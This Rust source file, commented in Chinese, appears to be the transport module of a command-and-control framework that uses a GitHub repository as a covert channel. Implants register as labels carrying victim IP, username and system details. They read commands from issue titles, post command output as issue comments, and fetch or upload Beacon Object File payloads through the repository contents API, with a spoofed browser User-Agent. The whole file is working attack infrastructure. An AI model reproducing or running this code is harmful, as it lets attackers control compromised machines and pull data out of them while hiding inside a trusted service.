
use reqwest::Client;
use serde_json::{json, Value};
use std::{error::Error, path::PathBuf};
use serde::{Deserialize, Serialize};
use base64::{engine::general_purpose::STANDARD, Engine};


#[derive(Serialize, Deserialize)]
pub struct Issue {
    pub owner: String,
    pub repo: String,
    pub issue_num: u64,
}

#[derive(Serialize, Deserialize)]
pub struct Comment {
    pub body: Vec<String>,
}

#[derive(Debug, Deserialize,Clone)]
pub struct GithubConfig {
    pub access_token: String,
    pub username: String,
    pub repository: String,
}

#[derive(Serialize, Deserialize,Debug)]
pub struct Metadata {
    pub id: String,
    pub ip: String,
    pub username: String,
    pub system: String,
}

pub struct Session{
    pub id: String,
    pub ip: String,
    pub username: String,
    pub system: String,
    pub time: String,
}

#[derive(Serialize, Deserialize,Debug)]
pub struct  Label{
    pub name:String,
    pub description:String,
}

#[derive(Serialize, Deserialize,Debug)]
pub struct  Implant{
    pub name:String,
    pub description:Metadata,
}

#[derive(Serialize, Deserialize,Debug,Hash, Eq, PartialEq, Clone)]
pub struct ExecCommand{
    pub title:String,
    pub id: i64,
    pub issue_num: i64,
}

//获取bof文件
pub async fn download_file(config:&GithubConfig,file_name:&String)-> Result<Vec<u8>, Box<dyn Error>>{
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/contents/{}", &config.username, &config.repository,&file_name);
    let auth_header = format!("Bearer {}", config.access_token);
    let response = client
    .get(&url)
    .header("Authorization", auth_header)
    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    .header("Accept",  "application/vnd.github+json")
    .send()
    .await?; // 异步等待响应

    if response.status().is_success() {
        let text = response.text().await?;
        let json: Value = serde_json::from_str(&text)?;
        let content_base64 = json.get("content").ok_or("Missing 'content' field")?.as_str().ok_or("Content is not a string")?;
        let content_base64 = content_base64.replace('\n', "");
        let decoded_content = STANDARD.decode(content_base64)?;
        Ok(decoded_content)
    } else {
        let text = response.text().await?;
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            text,
        )))
    }

}

// 上传bof file 到仓库
pub async fn upload_file(config:&GithubConfig,filepath:&PathBuf)-> Result<String, Box<dyn Error>>{
    let file_name = std::path::Path::new(filepath).file_name().unwrap().to_str().unwrap();
    let file_content = std::fs::read(filepath)?;
    let base64_encoded = STANDARD.encode(file_content);
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/contents/{}", &config.username, &config.repository,&file_name);
    let auth_header = format!("Bearer {}", config.access_token);
    let body = json!({
        "message": file_name,
        "content": base64_encoded,
        "committer":{"name":&config.username,"email":"nobody@github.com"}
    });

    let response = client
    .put(&url)
    .header("Authorization", auth_header)
    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    .header("Accept",  "application/json")
    .json(&body) // 发送 JSON 数据
    .send()
    .await?; // 异步等待响应

    if response.status().is_success() {
        let text = response.text().await?;
        Ok(text)
    } else {
        let text = response.text().await?;
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            text,
        )))
    }

}


//创建lable
pub async fn create_lable(config:&GithubConfig,lable_name:&String,metadata:&Metadata)-> Result<String, Box<dyn Error>> {
    let client = Client::new();

    let url = format!("https://api.github.com/repos/{}/{}/labels", config.username, config.repository);

    let auth_header = format!("Bearer {}", config.access_token);

    let metadata_string = serde_json::to_string(metadata).unwrap();

    let body = json!({
        "name":lable_name,
        "description":metadata_string,
        "color":"f29513"
    });

    let response = client
    .post(&url)
    .header("Authorization", auth_header)
    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    .json(&body) // 发送 JSON 数据
    .send()
    .await?; // 异步等待响应


    if response.status().is_success() {
        let text = response.text().await?;
        Ok(text)
    } else {
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to create label",
        )))
    }

}




//根据lable 获取issues（implant获取指令）
pub async fn get_label_issue(config:&GithubConfig,id:&String)->Result<Vec<ExecCommand>,Box<dyn Error>>{
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/issues?labels={}", config.username, config.repository,id);
    let auth_header = format!("Bearer {}", config.access_token);

    let response = client
        .get(&url)
        .header("Authorization", auth_header.clone())
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send()
        .await?; // 异步等待响应

        if response.status().is_success() {
            // 处理响应，比如解析 JSON
            let text = response.text().await?;
            let commands = extract_commands_from_label(&text)?;
            Ok(commands)
        } else {
            eprintln!("Error fetching labels: {}", response.status());
            Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Failed to get labels",
            )))
        }
}

//获取labels
pub async fn get_labels(config:&GithubConfig)-> Result<String, Box<dyn Error>>{
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/labels?per_page=100", config.username, config.repository);
    let auth_header = format!("Bearer {}", config.access_token);

    let response = client
        .get(&url)
        .header("Authorization", auth_header.clone())
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .send()
        .await?; // 异步等待响应

        if response.status().is_success() {
            // 处理响应，比如解析 JSON
            let text = response.text().await?;
            Ok(text)
        } else {
            eprintln!("Error fetching labels: {}", response.status());
            Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Failed to get labels",
            )))
        }

}




//删除label
pub async fn delete_issue(config:&GithubConfig,lable_name:&String)-> Result<String, Box<dyn Error>> {
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/labels/{}", config.username, config.repository,lable_name);
    let auth_header = format!("Bearer {}", config.access_token);

    let response = client
    .delete(&url)
    .header("Authorization", auth_header)
    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    .send()
    .await?; // 异步等待响应

    if response.status().is_success() {
        let text = response.text().await?;
        println!("{}",text);
        Ok(text)
    } else {
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to delete issue",
        )))
    }
}


//提交comment
pub async fn post_comment(config:&GithubConfig,result:&String,issue_number:&i64)-> Result<(), Box<dyn Error>> {
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments", config.username, config.repository,issue_number);
    let auth_header = format!("Bearer {}", config.access_token);

    let body = json!({
        "body":result,
    });

    let response = client
    .post(&url)
    .header("Authorization", auth_header)
    .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    .json(&body) // 发送 JSON 数据
    .send()
    .await?; // 异步等待响应

    if response.status().is_success() {
        Ok(())
    } else {
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to post comment",
        )))
    }
}





//提交issue
pub async fn post_issue(config:&GithubConfig,task:&String,label:&String)-> Result<i64, Box<dyn Error>> {
    let client = Client::new();

    let url = format!("https://api.github.com/repos/{}/{}/issues", config.username, config.repository);

    let auth_header = format!("Bearer {}", config.access_token);

    // 创建 POST 请求的 JSON 数据
    let body = json!({
        "title": task,
        "body": task,
        "labels":[label],
    });

    let response = client
        .post(&url)
        .header("Authorization", auth_header)
        .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .json(&body) // 发送 JSON 数据
        .send()
        .await?; // 异步等待响应


    if response.status().is_success() {
        let text = response.text().await?;
        let issue_id = if let Ok(number) = extract_issue_id(text.to_string()) {
            number
        } else {
            eprintln!("Error extracting issue number");
            0//报错为0
        };
        Ok(issue_id)
    } else {
        Err(Box::new(std::io::Error::new(
            std::io::ErrorKind::Other,
            "Failed to post issue",
        )))
    }

}

//获取指定issueid下的comment
pub async fn get_comment(config:&GithubConfig,issue_number:&i64)->Result<Comment,  Box<dyn Error>>{
    let client = Client::new();
    let url = format!("https://api.github.com/repos/{}/{}/issues/{}/comments", config.username, config.repository, issue_number);
    let auth_header = format!("Bearer {}", config.access_token);
    let response = client
        .get(&url)
        .header("Authorization", auth_header)
        .header("Content-Type", "application/json")
        .header("User-Agent", "Mozilla/5.0 (compatible; Rust Client)") // Add a User-Agent
        .send()
        .await?; // Await the result of the request

    if response.status().is_success() {
            // Read the response body as a string
            let resp = response.text().await?; // Await the response body

            let body  = find_comment_body(resp)?;

            let commnet:Comment = Comment{
                body
            };
            Ok(commnet)
    } else {
            Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Failed to fetch comments",
            )))
        }
}


//提取comment中的body部分
fn find_comment_body(comment:String) -> Result<Vec<String>, Box<dyn Error>>{
    let comments: Vec<Value> = serde_json::from_str(&comment)?;
    let bodies: Vec<String> = comments
        .into_iter()
        .filter_map(|comment| comment.get("body").and_then(|b| b.as_str().map(|s| s.to_string())))
        .collect();
    Ok(bodies)
}

// 提取issue number 字段
fn extract_issue_id(resp:String) -> Result<i64, Box<dyn Error>>{
    let json_value: Value = serde_json::from_str(&resp)?;
    if let Some(number) = json_value.get("number") {
        if let Some(number) = number.as_i64() {
            return Ok(number);
        }
    }

    Err("Number field not found or is not an i64".into())
}



//将label string转换为implants，提取 label中 name字段，判断满足id格式的label name,处理Label description(包括解密)，返回Implant。
pub fn convert_label_implants(resp: &String) -> Result<Vec<Implant>, Box<dyn Error>> {
    // 解析 JSON 数据为 Label 数组
    let mut labels: Vec<Label> = serde_json::from_str(resp)?;
    let excluded_names = vec!["question".to_string()];
    let mut implant_vec: Vec<Implant> = Vec::new();
    
    // 检查每个 Label 的 name 是否符合条件
    labels.retain(|label| {
        if label.name.len() == 8 && label.name.chars().all(|c| c.is_alphanumeric()) && !excluded_names.contains(&label.name){
            true
        }else{
            false
        }
    });

    for label in labels {
        // 尝试解析 description
        let description: Metadata = serde_json::from_str(&label.description)?;

        // 创建新的 Implant 实例，并将 description 转换为 Metadata
        let implant = Implant {
            name: label.name,
            description: description,
        };
        implant_vec.push(implant);
    }

    Ok(implant_vec)
}

//从label返回中提取命令和命令id
pub fn extract_commands_from_label(response: &String) -> Result<Vec<ExecCommand>, Box<dyn std::error::Error>> {
    let parsed: Value = serde_json::from_str(response.as_str())?;

    // 初始化 Command 向量
    let mut commands = Vec::new();

    // 遍历 JSON 数组中的每个对象
    if let Some(issues) = parsed.as_array() {
        for issue in issues {
            let title = issue["title"].as_str().unwrap_or("").to_string();
            let id = issue["id"].as_i64().unwrap_or(0);
            let issue_num = issue["number"].as_i64().unwrap_or(0);
            // 将每个 title 和 id 添加到 Command 中
            commands.push(ExecCommand { title, id,issue_num});
        }
    }

    Ok(commands)
}